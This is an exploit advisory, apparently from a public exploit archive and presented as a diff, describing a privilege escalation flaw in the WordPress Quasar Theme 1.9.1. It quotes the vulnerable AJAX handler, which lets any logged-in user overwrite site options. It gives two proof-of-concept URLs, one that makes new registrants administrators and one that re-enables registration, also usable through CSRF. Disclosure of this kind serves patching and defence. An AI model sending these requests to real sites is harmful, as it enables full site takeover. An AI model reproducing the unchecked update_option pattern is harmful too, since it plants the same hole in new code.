@@ -1,0 +1,71 @@
+id: 23230
+date: 02/04/2015
+title: WordPress Quasar Theme 1.9.1 Privilege Escalation Vulnerability
+author: Evex
+cves: 
+
+------------------------------------------------------------------------------
+WordPress Quasar Theme Previlege Escalation
+------------------------------------------------------------------------------
+
+
+[-] Theme Link:
+
+http://themeforest.net/item/quasar-wordpress-theme-with-animation-builder/6126939?ref=XanderRock
+
+
+[-] Affected Version:
+
+Version 1.9.1
+
+
+[-] Vulnerability Description:
+
+The vulnerable code is located in the /rock-builder/rock-builder-ui.php
+script:
+
+function rock_builder_save_template(){
+
+    $data = $_REQUEST['data'];
+    $template = $_REQUEST['template'];
+
+    $templateName = $template['name'];
+    $templateDBName = $template['database_name'];
+    update_option($templateDBName, $data);
+
+    $builderReferences = get_option("rock_builder_references",array());
+
+    $i = 0;
+    foreach($builderReferences as $ref){
+        if($ref['database_name'] == $templateDBName){
+            $builderReferences[$i]['name'] = $templateName;
+            update_option("rock_builder_references",$builderReferences);
+            //echo "FOUND";
+            break;
+        }
+        $i++;
+    }
+
+    exit;
+}
+add_action("wp_ajax_rockAjax_save_builder_template","rock_builder_save_template");
+
+then function rock_builder_save_template can be called by logged in users
+and executed which can lead to modifying wordpress settings and adding a
+new administrator which may cause the site a full take over
+
+
+[-] Proof of Concept:
+
+
+Accessing The Url below with a logged in user will set the default role of
+any new registered user as administrator(if you already had a user)
+http://domain.tld/wp-admin/admin-ajax.php?action=rockAjax_save_builder_template&data=administrator&template[database_name]=default_role
+
+Accessing The Url below with a logged in user will allow user registration
+if it was disabled
+this can be exploited by sending it to a logged in user or administrater
+(CSRF)
+http://domain.tld/wp-admin/admin-ajax.php?action=rockAjax_save_builder_template&data=1&template[database_name]=users_can_register
+
+#  0day.today [2023-03-25]  #
